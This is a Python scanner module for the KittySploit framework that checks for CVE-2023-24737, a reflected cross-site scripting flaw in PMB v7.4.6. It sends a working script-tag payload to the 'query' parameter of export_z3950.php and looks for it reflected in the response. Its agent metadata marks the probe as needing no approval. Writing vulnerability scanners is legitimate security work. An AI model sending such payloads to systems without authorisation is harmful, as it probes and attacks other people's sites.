#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PMB v7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PMB v7.4.6 - Cross-Site Scripting Detection',
        'description': "PMB v7.4.6 allows an attacker to perform a reflected XSS on export_z3950.php via the 'query' parameter.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2023', 'cve', 'xss', 'pmb', 'pmb_project', 'sigb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/AetherBlack/CVE/blob/main/PMB/readme.md',
            'https://github.com/AetherBlack/CVE/tree/main/PMB',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-24737',
        ],
        'cve': 'CVE-2023-24737',
    }

    def run(self):
        path = '/pmb/admin/convert/export_z3950.php?command=search&query=%3Cscript%3Ealert(document.domain);%3C/script%3E=or'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('3@1=<script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='PMB v7.4.6 - Cross-Site Scripting detected', path=path)
            return True
        return False

